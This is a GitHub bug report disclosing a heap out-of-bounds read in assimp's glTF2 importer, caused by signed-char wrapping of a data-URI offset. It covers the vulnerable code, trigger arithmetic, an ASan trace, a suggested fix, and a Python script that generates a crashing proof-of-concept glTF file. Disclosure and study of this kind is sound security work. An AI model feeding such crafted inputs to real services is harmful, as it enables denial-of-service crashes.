# Bug: Heap-buffer-overflow in glTFCommon::ParseDataURI with long data: URIs

https://github.com/assimp/assimp/issues/6927 (opened 2026-10-13T15:31:50Z)

## The bug

The glTF2 importer performs an out-of-bounds heap read when a buffer is embedded as a raw
(non-base64) `data:` URI whose data segment starts beyond byte 127 of the URI string.

`glTFCommon::Util::ParseDataURI()` parses `data:` URIs in place and packs the parsed
data-segment offset into one of the URI string's own bytes: `uri[4] = char(i)`.
On platforms where `char` is signed (x86-64 Linux/macOS), an offset greater than 127 wraps
negative. The function then computes

* `out.data = uri + uri[4]` — a pointer *before* the URI buffer, and
* `out.dataLength = (uri + uriLen) - out.data` — a length inflated by the wrap amount.

`glTF2::Buffer::Read()`'s only guard is `statedLength != dataURI.dataLength`, where
`statedLength` comes from the file's own `"byteLength"` JSON field. Declaring
`"byteLength"` equal to the wrapped length makes the check pass, and `memcpy()` then reads
out of bounds.

**Impact:** a crafted glTF causes a deterministic out-of-bounds read and process abort when
importing untrusted files with the default glTF2 importer (crash / denial of service).
No write primitive was demonstrated.

**Affected versions:** 6.0.5. (Current `master` is affected as well — `glTFCommon.cpp` is
unchanged as of 2026-10-13.)

## ASAN report

```text
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x515000000f39
READ of size 257 at 0x515000000f39 thread T0
    #0 memcpy
    #2 glTF2::Buffer::Read(...)                    code/AssetLib/glTF2/glTF2Asset.inl:605
    #3 glTF2::LazyDict<glTF2::Buffer>::Retrieve    code/AssetLib/glTF2/glTF2Asset.inl:509
    #4 glTF2::BufferView::Read(...)                code/AssetLib/glTF2/glTF2Asset.inl:767
    #6 glTF2::Accessor::Read(...)                  code/AssetLib/glTF2/glTF2Asset.inl:873
    ...
    #14 glTF2::Asset::Load(...)                    code/AssetLib/glTF2/glTF2Asset.inl:2109
    #15 Assimp::glTF2Importer::InternReadFile      code/AssetLib/glTF2/glTF2Importer.cpp:1782
    #16 Assimp::BaseImporter::ReadFile             code/Common/BaseImporter.cpp:131
    #17 Assimp::Importer::ReadFile                 code/Common/Importer.cpp:709
    #18 Assimp::Importer::ReadFileFromMemory       code/Common/Importer.cpp:507
0x...f39 is located 71 bytes before 458-byte region
allocated by thread T0 here:
    #7 glTF2::Asset::ReadDocument(...)             code/AssetLib/glTF2/glTF2Asset.inl:2007
SUMMARY: AddressSanitizer: heap-buffer-overflow ... glTF2Asset.inl:605 in glTF2::Buffer::Read(...)
```

## Root cause and vulnerable code

`code/AssetLib/glTFCommon/glTFCommon.cpp` (6.0.5, identical on master):

```cpp
size_t i = 5, j;
if (uri[i] != ';' && uri[i] != ',') { // has media type?
    uri[1] = char(i);
    for (; i < uriLen && uri[i] != ';' && uri[i] != ','; ++i) {
        // nothing to do!
    }
}
while (i < uriLen && uri[i] == ';') {
    uri[i++] = '\0';
    ...
    if (strncmp(uri + j, "charset=", 8) == 0) {
        uri[2] = char(j + 8);
    } else if (strncmp(uri + j, "base64", 6) == 0) {
        uri[3] = char(j);
    }
}
if (i < uriLen) {
    uri[i++] = '\0';
    uri[4] = char(i);                                  // :88  data offset packed as SIGNED char
} else {
    uri[1] = uri[2] = uri[3] = 0;
    uri[4] = 5;
}
...
out.data = uri + uri[4];                               // :104 pointer formed from wrapped offset
out.dataLength = (uri + uriLen) - out.data;            // :105 length inflated by the wrap
```

`code/AssetLib/glTF2/glTF2Asset.inl` — `glTF2::Buffer::Read`, raw-data branch:

```cpp
} else { // assume raw data
    if (statedLength != dataURI.dataLength) {            // :599 passes when both are the wrapped value
        throw DeadlyImportError("GLTF: buffer \"", id, "\", expected ", ai_to_string(statedLength),
                " bytes, but found ", ai_to_string(dataURI.dataLength));
    }
    this->mData.reset(new uint8_t[dataURI.dataLength], std::default_delete<uint8_t[]>());
    memcpy(this->mData.get(), dataURI.data, dataURI.dataLength);   // :605 OOB READ
}
```

Trigger arithmetic for the attached PoC:

| Value | Computation | Result |
|---|---|---|
| URI | `"data:"` + 133×`A` + `",X"` | `uriLen = 140` |
| data offset | index of `X` (after the `,`) | `i = 139` |
| stored byte | `uri[4] = char(139)` | `-117` (signed `char` wrap) |
| `dataURI.data` | `uri + (-117)` | **117 bytes before the buffer** |
| `dataURI.dataLength` | `(uri + 140) - (uri - 117)` | **257** |
| file declares | `"byteLength": 257` | guard `statedLength == dataURI.dataLength` passes |
| sink | `memcpy(dst, dataURI.data, 257)` | **OOB read of 257 bytes** |

## Reproduction

1. Build with ASan (or use the existing fuzzer setup):

   ```bash
   cmake -S . -B build-asan -DCMAKE_BUILD_TYPE=Debug \
     -DCMAKE_CXX_FLAGS="-fsanitize=address -g -fno-omit-frame-pointer" \
     -DCMAKE_C_FLAGS="-fsanitize=address -g -fno-omit-frame-pointer" \
     -DASSIMP_BUILD_TESTS=OFF
   cmake --build build-asan -j
   ```

2. Use the attached `gltf_datauri_wrap.gltf` (457 bytes), or generate it:

   ```python
   import json
   uri = "data:" + "A" * 133 + ",X"          # data offset 139 > 127 -> char(139) = -117
   doc = {
       "asset": {"version": "2.0"},
       "buffers": [{"uri": uri, "byteLength": 257}],
       "bufferViews": [{"buffer": 0, "byteOffset": 0, "byteLength": 12}],
       "accessors": [{"bufferView": 0, "componentType": 5126, "count": 1, "type": "VEC3"}],
       "meshes": [{"primitives": [{"attributes": {"POSITION": 0}}]}],
       "nodes": [{"mesh": 0}], "scenes": [{"nodes": [0]}], "scene": 0,
   }
   open("poc.gltf", "w").write(json.dumps(doc, separators=(",", ":")))
   ```

3. Import through any public entry point, e.g. `Importer::ReadFileFromMemory(data, size, 0, "gltf")`,
   or the sanitizer-instrumented glTF fuzz target:

   ```bash
   ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 ./assimp_fuzzer_gltf gltf_datauri_wrap.gltf
   ```

4. Observed: deterministic abort (`exit=134`) with the ASan report above.

**Control:** the same file with a short URI (`"data:"` + 20×`A` + `",X"`, data offset 26, no wrap)
does not crash — it fails with a normal import error
(`GLTF: Accessor with offset/length (0/12) is out of range.`), confirming the crash is specific
to the signed-char wrap.

## Suggested fix

Store the media-type/charset/base64/data offsets as unsigned (`size_t` / `unsigned char`), and
validate the data offset against `uriLen` before computing `out.data` / `out.dataLength`
(the existing in-place sentinel packing relies on offsets fitting in a signed byte).

## Environment

- assimp 6.0.5, static build, g++ 13.3.0, x86-64 Linux, AddressSanitizer
- Default importer flags (`ReadFileFromMemory(..., 0, "gltf")`)
